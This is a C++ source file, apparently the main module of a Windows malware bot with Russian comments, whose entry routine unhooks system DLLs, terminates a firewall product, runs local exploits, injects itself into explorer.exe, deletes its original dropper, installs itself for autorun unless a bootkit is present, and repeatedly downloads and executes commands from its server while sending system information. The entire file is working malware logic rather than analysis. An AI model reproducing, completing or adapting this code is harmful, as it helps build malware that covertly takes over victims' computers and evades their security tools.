#include <windows.h>

#include "BotCore.h"

#include "Utils.h"
#include "Exploit.h"
#include "BotUtils.h"
#include "Rootkit.h"
#include "Inject.h"
#include "Unhook.h"
#include "Loader.h"
#include "Config.h"
#include "Crypt.h"
#include "ntdll.h"
#include "Task.h"
#include "md5.h"
#include "BotDef.h"
#include "Modules.h"
#include "StrConsts.h"



#include "BotDebug.h"

//********************** Отладочные шаблоны **********************************

namespace MAINDBGTEMPLATES
{
	#include "DbgTemplates.h"
}

// Объявляем шаблон вывода отладочных строк
#define MDBG MAINDBGTEMPLATES::DBGOutMessage<>


//***************************************************************************




#pragma comment(linker, "/ENTRY:MyMain" )
//#pragma comment(linker, "/ENTRY:ExplorerMain" )



WCHAR TempFileName[ MAX_PATH ]; //темп файл для добавления в автозагрузку
WCHAR FileToDelete[ MAX_PATH ]; //путь для удаления первоначального файла бота

DWORD dwKillPid		 = 0; //пид для убийства процесса бота
DWORD dwFirst	     = 0; //запуск в первый раз
DWORD dwAlreadyRun   = 0; //если уже запущены
DWORD dwGrabberRun	 = 0; //отработал ли граббер
DWORD dwExplorerSelf = 0; //если инжект был в собственный эксплорер
//DWORD dwExplorerPid  = 0; //пид эксплорера


//получаем пид эксплорера


void InternalAddToAutorun()
{
	// Добавляем программу в автозагрузку
	// только в случае если в системе не зарегистрирован мьютекс
	// сигнализирующий об успешной установке буткита
	#ifndef DEBUGBOT
		const static char ButkitMutex[] = {'b', 'k', 't', 'r', 'u', 'e',  0};
		HANDLE Mutex = (HANDLE)pOpenMutexA(SYNCHRONIZE, TRUE, (PCHAR)ButkitMutex);
		if (Mutex)
		{
			pCloseHandle(Mutex);
			MDBG("Main", "Буткит установлен. Игнорируем добавление в автозагрузку.");
			return;
		}

		bool ServiceInstalled = false;
		if (!WSTR::IsEmpty(TempFileName))
		{
				PCHAR Name = WSTR::ToAnsi(TempFileName, 0);

				BOT::Install(Name, false);
				//BOT::InstallService(Name);
				//BOT::AddToAutoRun(Name);
				STR::Free(Name);
		}
	#endif
}


BOOL DeleteDropper() // убиваем процесс, стираем файл
{
	BOOL Result = FALSE;
	if ( dwKillPid != 0 && !WSTR::IsEmpty(FileToDelete))
	{
		
		pWinStationTerminateProcess(NULL, dwKillPid, DBG_TERMINATE_PROCESS );	
		pSetFileAttributesW( FileToDelete, FILE_ATTRIBUTE_ARCHIVE );
		Result = (BOOL)pDeleteFileW(FileToDelete);
		MDBG("Main", "Удаляем дропер %LS [Result=%d]", FileToDelete, Result);
	}
	return Result;
}

DWORD WINAPI LoaderRoutine( LPVOID lpData )
{
	BOT::Initialize();
	
	MDBG("Main", "TestLoaderRoutine ");

	UnhookDlls();


	// Отключаем отображение ошибок при крахе процесса
	DisableShowFatalErrorDialog();

	bool FirstSended = false;

	if (InitializeTaskManager(NULL, true))
	{
		for (int i = 1; i <= 1; i++)
		{

			DownloadAndExecuteCommand(NULL, NULL);

			// "Гениальность" проектирования взаимосвязи бота и его сервера
			// отправка стартовой информации должна идти только после получения
			// команды
			if (!FirstSended)
			{
				MDBG("Main", "=====>> Отправляем информацию о системе");
				FirstSended = SendFirstInfo();
			}
		}

    }
	pExitProcess(0);
	return 0;
}

void ExplorerMain()
{
	BOT::Initialize();

	// Создаем мьютекс запущенного бота для сигнализации другим 
	// способам автозапуска.
	//BOT::TryCreateBotInstance();

//	if ( !dwExplorerSelf )
//		UnhookDlls();

//	InternalAddToAutorun();

	DeleteDropper();


	//----------------------------------------------------

	if ( !dwAlreadyRun )
		MegaJump( LoaderRoutine );
	
	//MegaJump(AvFuckThread);
	
	// 
//	HookZwResumeThread();
//	HookZwQueryDirectoryFile();

	// Входим в бесконечный цикл работы 
}




DWORD WINAPI ExplorerRoutine( LPVOID lpData )
{

	BOT::Initialize();

//	UnhookDlls();

	
	if (dwExplorerSelf) 
	{
		//если инжект был в свой эксплорер завершаемся	
		dwExplorerSelf = 0;
		if (!InjectIntoExplorer(ExplorerRoutine))
		{
			ExplorerMain();
		}

		pExitProcess(1);
	}
	ExplorerMain();
	return 0;
}



int APIENTRY MyMain() 
{
	BOT::Initialize(); 

	MDBG("Main", "Запускается бот. Версия бота %s\r\nEXE: %s", BOT_VERSION, Bot->ApplicationName().t_str());
	
	MDBG("Main", "Звпускается Ring3 версия бота");
	// Запускается ринг3 версия
	BOT::SetBotType(BotRing3);

	// Проверяем не запущен ли на данном компьютере другой экземпляр бота
	/*if (BOT::IsRunning())
	{
		pExitProcess(0);
		return 0;
	}*/

	MDBG("Main", "Запускается бот. Версия бота %s", BOT_VERSION);


	UnhookDlls(); //снимаем хуки

	WCHAR ModulePath[MAX_PATH];

	pGetModuleFileNameW( NULL, ModulePath, MAX_PATH );

	DWORD dwProcessHash = File::GetNameHashW(ModulePath, false);
	DWORD dwProcessHash2 = File::GetNameHashW(ModulePath, true);
	
	MDBG( "Main", "В процессе %S, %08x", ModulePath, dwProcessHash2 );

	bool inExplorer = dwProcessHash2 == 0x490A0972 ? true : false; //true если запустили в процессе проводника

	if ( dwProcessHash == BOT::GetBotExeNameHash()) // запуск из самого бота
	{
		KillOutpost();
		DWORD dwExploits = SetExploits();

		if ( !dwExploits )
		{
			if ( MegaJump( LoaderRoutine ) )
			{
				dwAlreadyRun = 1;
			}
		}

		dwExplorerSelf = 1;

		if ( !JmpToExplorer( ExplorerRoutine ) )
		{
			dwExplorerSelf = 0;

			if ( !InjectIntoExplorer( ExplorerRoutine ) && !dwAlreadyRun )
			{
				MegaJump( LoaderRoutine );
			}
		}		
	}
	else
	{
		dwFirst = 1;

		KillOutpost();

		DWORD dwExploits = SetExploits();

		if ( !dwExploits )
		{
			if (MegaJump(LoaderRoutine))
			{
				dwAlreadyRun = 1;
			}

			#ifdef GrabberH
				if ( MegaJump( GrabberThread ) )
					dwGrabberRun = 1;
			#endif 
		}

		dwExplorerSelf = 1;
		if( inExplorer )
		{
			MDBG( "Main", "Стартанули в процессе explorer.exe" );
			FileToDelete[0] = 0; //если в процессе проводника, то самоудаление не нужно
			TempFileName[0] = 0;
			dwExplorerSelf = 0;
			RunThread( ExplorerRoutine, 0 );
		}
		else
		{
			m_wcsncpy(FileToDelete, ModulePath, m_wcslen( ModulePath ) );
			dwKillPid = (DWORD)pGetCurrentProcessId();
			CopyFileToTemp( ModulePath, TempFileName );	
			if (!JmpToExplorer(ExplorerRoutine ) )
			{
				dwExplorerSelf = 0;

				InternalAddToAutorun();
			}
		}
	}

	if( !inExplorer) 
		pExitProcess(1);
	return 1;
}